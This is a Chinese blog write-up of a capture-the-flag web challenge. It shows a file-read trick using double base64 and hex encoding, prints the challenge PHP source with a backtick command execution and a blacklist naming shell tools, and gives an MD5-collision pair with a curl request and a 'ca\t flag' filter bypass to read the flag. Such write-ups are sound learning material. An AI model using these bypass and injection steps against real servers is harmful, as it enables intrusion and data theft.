+<p>看了一下源代码，发现有个base64</p>
+<p>于是我把url上面奇怪的字符串用base转了两下，得到16进制，16进制再转utf-8，得到 图片名字 555.png</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="C:\Users\21709\Pictures\Screenshots\屏幕截图 2026-01-22 194211.png" alt="屏幕截图 2026-01-22 194211" style="zoom: 50%;" /></h3><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260122194100421.png" alt="image-20260122194100421" style="zoom: 67%;" />
+
+
+
+<p>因为在cmd无值的情况下我们仍然在返回页面看到了png，所以先不管cmd；</p>
+<p>或许我们是否可以在img传入我们想要看到的文件，</p>
+<p>比如源码index.php，但是这里需要刚刚相反的进制转换：</p>
+<p>hex*4-&gt;</p>
+<p>696e6465782e706870</p>
+<p>base64*2-&gt;-&gt;</p>
+<p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p>
+<p>得到一堆base64，转码得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);	//错误被隐藏，后续img和cmd不传参导致的错误不再显示</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>小知识点：</p>
+<p><strong><code>E_ALL || ~ E_NOTICE</code></strong>。</p>
+<ul>
+<li><strong><code>~ E_NOTICE</code></strong>： <code>~</code> 是按位取反运算符。在二进制层面，<code>E_NOTICE</code> 的位被置 0，其余位全部置 1。</li>
+<li><strong><code>||</code></strong>： 这是<strong>逻辑或</strong>（Logical OR），不是位或（Bitwise OR <code>|</code>）。 在 PHP 中，<code>E_ALL</code> 是一个非零整数（True），<code>~ E_NOTICE</code> 也是一个非零整数（True）。 <strong><code>True || True</code> 的结果永远是布尔值 <code>1</code>。</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点：</p>
+<p>post传参a，b，MD5强比较绕过</p>
+<p>1.string会强制转换，所以不能传入数组，因为被转换后变成array，值就相等了；</p>
+<p>2.!&#x3D;&#x3D;：值不一样 || 类型不一样 （二选一满足即可）</p>
+<p>3.&#x3D;&#x3D;&#x3D;值和类型都一样</p>
+<p>传入a和b满足值不一样，但是md5过后的值和类型都要一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+<p>考虑过滤，用dir代替ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X -POST &quot;http://e220bba8-1583-48f3-aa75-54e78da3e6f1.node5.buuoj.cn:81/index.php?img=&amp;cmd=dir+/&quot; -d &quot;a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20260122202647944.png" alt="image-20260122202647944"></p>
+<p>看到flag，考虑绕过，用ca\t flag</p>
+<p><img src="/images/image-20260122202713163.png" alt="image-20260122202713163"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io/posts/2198140d.html">https://2829750658t-svg.github.io/posts/2198140d.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://2829750658t-svg.github.io" target="_blank">24kmagic</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web-%E6%9C%AA%E6%95%B4%E7%90%86/">web-未整理</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/392ab792.html" title="sql_notes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">sql_notes</div></div><div class="info-2"><div class="info-item-1">1.双写select2.报错注入floor 向下取整 rand():0-1 floor(rand()*2):0,1,1循环 3 种核心方法：floor、extractvalue、updatexml——报错注入就是 “故意让数据库报错，从错误信息里偷数据” 先统一前提（CTF 里常用）假设是单引号字符型注入（比如 Less-1），注入点是?id=1&#39;，我们要偷的是 “当前数据库名”（用database()函数获取）。 1. floor 报错注入（最经典：临时表撞车）核心逻辑：(MySQL 在 GROUP BY 时，如果产生了“同一组的键不同但随机重复”，就会报错) ​	用group by建临时表，配合floor(rand(0)*2)生成重复数据，导致 “主键冲突” 报错。 1.1 主键： concat(数据库名, floor(rand(0)*2))的结果，比如security1 ​	  concat(database(),0x7e,floor(rand(0)*2)) -&gt; security~1	 提示： x会多算一次：（因为外面groupby算一次，里面as x也算一...</div></div></div></a><a class="pagination-related" href="/posts/cacccfa7.html" title="web-xss"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">web-xss</div></div><div class="info-2"><div class="info-item-1">web-xss1.反射型（外部输入后，在浏览器端输出触发） 2.存储型（东西存在文件中，web程序读取代码并输出） 知识点1： html实体编码： HTML 实体编码 的规则是： &amp;# + 十进制 ASCII 码 + ;  字母 r 的十进制 ASCII 码是 114。 所以它的 HTML 实体编码就是 r。  CSRF：到底是什么？ 黑客没偷你的证件（他拿不到 Cookie）。 黑客只是骗你点了一下按钮（利用了你还在登录状态的权限）。 结果： 在你完全不知情的情况下，你的身份被黑客**“借用”**了。 举例： &lt;img= src=1 oner&amp;#114;or=ale&amp;#114;t(1)&gt; 知识点2： Referer 是看你从哪来。 Token 是看你带没带暗号。  Sec-Fetch  Sec: 是 Security（安全）的缩写。 Fetch: 翻译为 “获取” 或 “抓取”（在编程里指代发起一个网络请求）。 合起来的意思： “安全获取元数据”（Security Fetch Metadata）。  它是浏览器在发起请求时，自动给服务器打的“...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="知乎"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="小红书"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="网易云音乐"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">很高兴能向你展示我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E6%9C%AA%E6%95%B4%E7%90%86%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">web-未整理解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">3.1.</span> <span class="toc-text">1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">[强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">4.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pikachu%E9%9D%B6%E5%9C%BA-SQL%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88post%EF%BC%89%E9%A2%98%E8%A7%A3"><span class="toc-number">5.</span> <span class="toc-text">Pikachu靶场-SQL注入-数字型注入（post）题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pikachu%E9%9D%B6%E5%9C%BA-SQL%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88get%EF%BC%89%E9%A2%98%E8%A7%A3"><span class="toc-number">6.</span> <span class="toc-text">Pikachu靶场-SQL注入-字符型注入（get）题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pikachu%E9%9D%B6%E5%9C%BA-SQL%E6%B3%A8%E5%85%A5-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5-%E9%A2%98%E8%A7%A3"><span class="toc-number">7.</span> <span class="toc-text">Pikachu靶场-SQL注入-搜索型注入 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pikachu%E9%9D%B6%E5%9C%BA-SQL%E6%B3%A8%E5%85%A5-xx%E5%9E%8B%E6%B3%A8%E5%85%A5-%E9%A2%98%E8%A7%A3"><span class="toc-number">8.</span> <span class="toc-text">Pikachu靶场-SQL注入-xx型注入 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-7-%E9%A2%98%E8%A7%A3"><span class="toc-number">9.</span> <span class="toc-text">sqli-7 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-8-%E9%A2%98%E8%A7%A3%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">sqli-8 题解（布尔盲注）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%89%8B%E6%90%93"><span class="toc-number">10.1.</span> <span class="toc-text">方法一：手搓</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.2.</span> <span class="toc-text">一、布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.3.</span> <span class="toc-text">二、时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping-1-%E9%A2%98%E8%A7%A3"><span class="toc-number">11.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping 1 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-robots-%E9%A2%98%E8%A7%A3"><span class="toc-number">12.</span> <span class="toc-text">攻防世界 robots 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">13.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%A2%98%E8%A7%A3"><span class="toc-number">13.1.</span> <span class="toc-text">1题解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">13.1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-PIPES-AS-CONCAT%EF%BC%9A%E5%B0%86-%E6%88%96%E8%BF%90%E7%AE%97%E7%AC%A6-%E8%BD%AC%E6%8D%A2%E4%B8%BA-%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%8D%B3%E5%B0%86-%E5%89%8D%E5%90%8E%E6%8B%BC%E6%8E%A5%E5%88%B0%E4%B8%80%E8%B5%B7%E3%80%82"><span class="toc-number">13.1.2.</span> <span class="toc-text">1.PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-select%E8%AF%AD%E6%B3%95"><span class="toc-number">13.1.3.</span> <span class="toc-text">2. select语法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1%E6%90%9C%E7%B4%A2%E7%94%A8%E6%B3%95%EF%BC%88%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%89%E2%80%94%E2%80%94-%E4%B8%8D%E5%AD%98%E5%9C%A8%E4%BC%9A%E6%8A%A5%E9%94%99"><span class="toc-number">13.1.3.1.</span> <span class="toc-text">2.1搜索用法（查数据库里的数据）—— 不存在会报错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-%E8%BE%93%E5%87%BA%E7%94%A8%E6%B3%95%EF%BC%88%E6%89%93%E5%8D%B0%E5%B8%B8%E9%87%8F-%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89%E2%80%94%E2%80%94-%E6%B0%B8%E8%BF%9C%E4%B8%8D%E6%8A%A5%E9%94%99%EF%BC%8C%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E6%97%A0%E5%85%B3"><span class="toc-number">13.1.3.2.</span> <span class="toc-text">2.2 输出用法（打印常量 &#x2F; 表达式）—— 永远不报错，和数据库数据无关</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-3%EF%BC%9Aselect-hello-%E2%86%92-%E8%BE%93%E5%87%BA-hello%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E9%87%8F%EF%BC%8C%E5%A4%A9%E7%94%9F%E5%AD%98%E5%9C%A8%EF%BC%89%E3%80%82"><span class="toc-number">13.1.3.2.1.</span> <span class="toc-text">例子 3：select &#39;hello&#39;; → 输出 hello（字符串常量，天生存在）。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%9A%E8%BE%93%E5%85%A5payload%EF%BC%88%E7%B2%BE%E5%BF%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E6%81%B6%E6%84%8F%E8%AF%AD%E5%8F%A5%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8A%8A-%E7%9C%8B%E6%88%90%E6%8B%BC%E6%8E%A5"><span class="toc-number">13.1.4.</span> <span class="toc-text">思路一：输入payload（精心设计的恶意语句），然后把||看成拼接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-2025-05-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="toc-number">14.</span> <span class="toc-text">moectf 2025 05 第五章 打上门来！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2025-12-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="toc-number">15.</span> <span class="toc-text">MoeCTF 2025 12 第十二章 玉魄玄关·破妄</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">16.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%A2%98%E8%A7%A3-1"><span class="toc-number">16.1.</span> <span class="toc-text">1题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Java1%E9%A2%98%E8%A7%A3"><span class="toc-number">17.</span> <span class="toc-text">[RoarCTF 2019]Easy Java1题解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">17.1.</span> <span class="toc-text">正则表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%BE-flag%EF%BC%88%E6%9C%80%E5%B8%B8%E7%94%A8%EF%BC%81%EF%BC%89"><span class="toc-number">17.2.</span> <span class="toc-text">1. 找 flag（最常用！）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%95%E9%99%90%E5%88%B6%EF%BC%88Web-%E9%A2%98%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">17.3.</span> <span class="toc-text">2. 绕限制（Web 题常用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%AD%9B%E5%AF%86%E7%A0%81%EF%BC%88%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E9%A2%98%EF%BC%89"><span class="toc-number">17.4.</span> <span class="toc-text">3. 筛密码（密码破解题）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">18.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%A2%98%E8%A7%A3-2"><span class="toc-number">18.1.</span> <span class="toc-text">1题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">19.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">19.1.</span> <span class="toc-text">1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1"><span class="toc-number">20.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-1"><span class="toc-number">21.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-16-%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94-%E9%A2%98%E8%A7%A3"><span class="toc-number">22.</span> <span class="toc-text">moectf 16 第十六章 昆仑星途 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">23.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%A2%98%E8%A7%A3-c%EF%BC%81"><span class="toc-number">23.1.</span> <span class="toc-text">1   题解 c！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Moe-web-%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="toc-number">24.</span> <span class="toc-text">Moe web 笑传之猜猜爆</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">25.</span> <span class="toc-text">猜数字游戏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF-revenge"><span class="toc-number">25.1.</span> <span class="toc-text">moectf web 01 第一章 神秘的手镯_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-04-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5-%E9%A2%98%E8%A7%A3"><span class="toc-number">25.2.</span> <span class="toc-text">moectf web 04 第四章 金曦破禁与七绝傀儡阵 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-06-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="toc-number">25.3.</span> <span class="toc-text">moectf web 06 第六章 藏经禁制？玄机初探！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-07-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="toc-number">25.4.</span> <span class="toc-text">moectf web 07 第七章 灵蛛探穴与阴阳双生符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 